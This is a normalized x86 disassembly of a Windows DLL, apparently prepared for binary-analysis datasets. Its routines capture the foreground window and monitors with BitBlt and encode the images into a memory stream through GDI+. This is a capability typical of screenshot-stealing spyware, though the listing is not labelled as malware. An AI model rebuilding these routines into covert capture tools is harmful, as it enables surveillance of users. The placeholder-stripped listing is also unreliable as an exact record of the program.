mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
push eax
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
push 0x40cc0020
push ecx
push edx
push esi
push ebx
push edi
push 0x0
mov [ ebp + 0xc ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push eax
call [ BitBlt@IAT ]
lea ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x14 ]
call sub_10002060
mov edi [ DeleteObject@IAT ]
push esi
call edi
mov edx [ ebp + 0xc ]
push edx
call edi
mov eax [ ebp - 0xc ]
push eax
call edi
push esi
call edi
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10008e50
push esi
mov esi ecx
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
push edi
cmp ecx eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edi [ esi ]
cmp edi ecx
je r-xdata
sub eax ecx
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
push 0x0
call [ GetDC@IAT ]
push esi
push sub_10008da0
mov edi eax
push 0x0
push edi
call [ EnumDisplayMonitors@IAT ]
push edi
push 0x0
call [ ReleaseDC@IAT ]
push edi
call [ DeleteObject@IAT ]
pop edi
mov al 0x1
pop esi
retn
mov eax ecx
sub eax ecx
push ebx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call sub_1001a060
add esp 0xc
add ebx edi
mov [ esi + 0x4 ] ebx
pop ebx
mov eax [ esi ]
mov ecx [ eax + edi * 4 ]
push ecx
call [ DeleteObject@IAT ]
mov edx [ esi + 0x4 ]
sub edx [ esi ]
inc edi
sar edx 0x2
cmp edi edx
jb r-xdata
sub_10008ee0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
call sub_10008e50
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov ebx eax
sub ebx ecx
sar ebx 0x2
cmp ecx eax
je r-xdata
mov edx [ esi ]
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push edx
call sub_1001a060
add esp 0xc
add edi [ ebp - 0x4 ]
mov [ esi + 0x4 ] edi
mov eax [ esi ]
mov ecx [ eax + edi * 4 ]
push ecx
call [ DeleteObject@IAT ]
mov edx [ esi + 0x4 ]
sub edx [ esi ]
inc edi
sar edx 0x2
cmp edi edx
jb r-xdata
sub_10008f60
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
push edi
mov [ ebp - 0x5c ] eax
xor eax eax
push eax
lea edx [ ebp - 0x78 ]
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] eax
mov esi ecx
mov ecx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x64 ]
push eax
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x78 ] 0x1
call GdiplusStartup
mov ecx esi
call sub_10008e50
mov ecx [ esi ]
mov edi [ GetDeviceCaps@IAT ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx eax
push 0xa
push ebx
call edi
push 0x8
push ebx
mov [ ebp - 0x50 ] eax
call edi
mov edx [ ebp - 0x50 ]
push edx
push eax
push ebx
call [ CreateCompatibleBitmap@IAT ]
mov ebx [ ebp - 0x54 ]
call [ GetForegroundWindow@IAT ]
lea edx [ ebp - 0x24 ]
push edx
push eax
mov [ ebp - 0x50 ] eax
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x50 ]
mov edi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
sub edi [ ebp - 0x24 ]
sub ebx [ ebp - 0x20 ]
push eax
call [ GetWindowDC@IAT ]
mov ecx [ ebp - 0x18 ]
sub ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
sub edx [ ebp - 0x24 ]
push ecx
push edx
mov [ ebp - 0x48 ] eax
push eax
mov eax [ esi ]
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x4c ]
push edx
push 0x0
push eax
mov [ edi ] r--data
mov [ ebp - 0x4c ] 0x0
call GdipCreateBitmapFromHBITMAP
mov ecx [ ebp - 0x4c ]
mov [ edi + 0x8 ] eax
mov [ edi + 0x4 ] ecx
jmp r-xdata
mov eax [ eax + ebx * 4 ]
push 0xa
push eax
mov [ ebp - 0x48 ] eax
call edi
mov ebx eax
mov eax [ ebp - 0x48 ]
push 0x8
push eax
call edi
mov ecx [ ebp - 0x48 ]
push ebx
mov edi eax
push edi
push ecx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x58 ]
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx [ edi + 0x4 ]
lea edx [ ebp - 0x14 ]
push edx
push eax
push ecx
call GdipSaveImageToStream
test eax eax
je r-xdata
mov edx [ r--data ]
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ ebp - 0x40 ] edx
mov edx [ r--data ]
mov [ ebp - 0x38 ] ecx
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x34 ] edx
mov edx [ ebp + 0x14 ]
push ecx
mov [ ebp - 0x3c ] eax
mov ebx 0x1
lea eax [ ebp + 0x10 ]
push edx
mov ecx esi
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x2c ] 0x4
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
call sub_10008bb0
lea eax [ ebp - 0x58 ]
push eax
push ebx
push 0x0
call [ CreateStreamOnHGlobal@IAT ]
test eax eax
js r-xdata
call [ CreateCompatibleBitmap@IAT ]
mov eax [ ebp - 0x48 ]
push eax
call [ CreateCompatibleDC@IAT ]
mov ecx [ ebp - 0x48 ]
push ebx
push edi
push ecx
mov [ ebp - 0x54 ] eax
call [ CreateCompatibleBitmap@IAT ]
mov edx [ ebp - 0x54 ]
push eax
push edx
mov [ ebp - 0x50 ] eax
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x54 ]
push 0xcc0020
push 0x0
push 0x0
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x48 ]
push eax
push ebx
push edi
push 0x0
push 0x0
push ecx
call [ BitBlt@IAT ]
push 0x10
call GdipAlloc
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x54 ]
mov ebx [ DeleteObject@IAT ]
push eax
call ebx
mov ecx [ ebp - 0x50 ]
push ecx
call ebx
mov edx [ ebp - 0x68 ]
push edx
call ebx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx eax
sar ecx 0x2
xor edi edi
test ecx ecx
je r-xdata
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
mov edx [ ebp - 0x58 ]
mov edi [ edx ]
lea ebx [ ebp - 0x80 ]
push ebx
push 0x2
xor ecx ecx
push ecx
xor eax eax
push eax
push edx
mov edx [ edi + 0x14 ]
call edx
test eax eax
js r-xdata
mov [ edi + 0x8 ] eax
jmp r-xdata
mov edx [ ebp - 0x48 ]
push edx
call ebx
mov eax [ ebp - 0x64 ]
push eax
call GdiplusShutdown
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov al 0x1
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn 0x14
nop
mov edi [ ebp - 0x4c ]
mov edx [ ebp - 0x58 ]
mov edi [ edx ]
xor ecx ecx
push ecx
push ecx
xor eax eax
push ecx
push eax
mov eax [ edi + 0x14 ]
push edx
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edx [ eax + edi * 4 ]
push edx
call ebx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx eax
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov eax [ ebp - 0x80 ]
mov edi [ ebp - 0x60 ]
push eax
mov [ edi ] eax
call sub_1001aa2a
mov ecx [ ebp - 0x5c ]
add esp 0x4
mov [ ecx ] eax
test eax eax
je r-xdata
mov edi [ edi ]
mov ecx [ ebp - 0x58 ]
mov edx [ ecx ]
push 0x0
push edi
push eax
mov eax [ edx + 0xc ]
push ecx
call eax
sub_10009250
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10019397
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_100193bf
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_10009280
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10019397
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_100193bf
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_100092d0
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ecx ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10019397
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_100193bf
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10009320
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x30 ]
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov [ edi ] esi
call sub_10019397
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp + 0x8 ]
call sub_100193bf
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_100093b0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_10019895
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_100093e0
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
pop esi
retn
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_10019ce4
add esp 0x4
sub_10009460
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10019c01
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_100094b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100191ba
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10009500
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100198d3
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10009540
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_10019cf0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0xc
sub_10009580
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_10019cf0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x10
sub_100095b0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_1001a3eb
jmp r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call sub_1001a8e4
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_10009610
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x17
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
sub esp 0x14
and ecx eax
je r-xdata
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esi 0x1
test cl 0x4
je r-xdata
push 0x0
push 0x0
call sub_1001a898
test cl 0x2
je r-xdata
call sub_100197af
mov edi eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0xc ] r--data
call sub_10019ba5
push r--data
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1001a898
call sub_100197af
lea ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0xc ] r--data
call sub_10019ba5
push r--data
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1001a898
call sub_100197af
lea edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0xc ] r--data
call sub_10019ba5
push r--data
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1001a898
sub_10009710
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10009740
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
push edi
xor edi edi
push edi
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_10009610
push 0x4
call sub_1001a818
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
mov [ esi + 0x30 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_100196a3
mov [ ebx ] eax
call sub_10019462
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10019397
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x8 ]
call sub_100193bf
pop edi
mov [ esi + 0x30 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ecx + 0x4 ] eax
sub_100097d0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10009800
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c5cb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x30
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_1000f050
jmp r-xdata
mov esi [ esi + 0x2c ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push 0x0
push eax
push sub_1000ece0
push 0x0
push 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x2c ] eax
call [ CreateThread@IAT ]
mov [ esi + 0x24 ] eax
cmp eax 0xffffffff
jne r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_1000ef90
push esi
call sub_10019ce4
add esp 0x4
sub_100098e0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_100199ff
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_10019ce4
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_10019397
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_100193bf
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10009a10
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_10009a40
push ebp
mov ebp esp
sub esp 0x8
xor eax eax
push ebx
mov ebx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
push esi
push edi
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
or edx 0xffffffff
cmp eax edx
je r-xdata
jg r-xdata
pop edi
pop esi
mov ecx [ ebp + 0x8 ]
inc ecx
add [ ebp - 0x8 ] 0x1
mov [ ecx - 0x1 ] al
mov [ ebp + 0x8 ] ecx
adc [ ebp - 0x4 ] 0x0
add [ ebp + 0xc ] edx
adc [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
mov ecx ebx
call sub_100099d0
mov edi edx
mov esi eax
test edi edi
jl r-xdata
jl r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push edx
call sub_10019cf0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x30 ]
add esp 0xc
add [ ebp - 0x8 ] esi
adc [ ebp - 0x4 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10009b10
push ebp
mov ebp esp
sub esp 0x8
xor eax eax
push ebx
mov ebx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
push esi
push edi
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ ebx ]
push eax
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
or ecx 0xffffffff
cmp eax ecx
je r-xdata
jg r-xdata
pop edi
pop esi
mov eax 0x1
add [ ebp + 0x8 ] eax
add [ ebp - 0x8 ] eax
adc [ ebp - 0x4 ] 0x0
add [ ebp + 0xc ] ecx
adc [ ebp + 0x10 ] ecx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
mov ecx ebx
call sub_100099f0
mov edi edx
mov esi eax
test edi edi
jl r-xdata
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ecx ]
push esi
push eax
push edx
call sub_10019cf0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x34 ]
add esp 0xc
add [ ebp - 0x8 ] esi
adc [ ebp - 0x4 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10009be0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_10009c10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_10009c40
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov eax [ ecx + 0x20 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov eax edx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_10009c90
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
add ebx eax
cmp eax ebx
jae r-xdata
or eax 0xffffffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
or eax 0xffffffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
movzx eax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_10009d00
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov ecx esi
or ecx ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov esi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_10009ec0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi eax
add esi [ ebp + 0xc ]
push edi
mov edi [ ecx + 0x24 ]
mov eax [ edi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp esi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
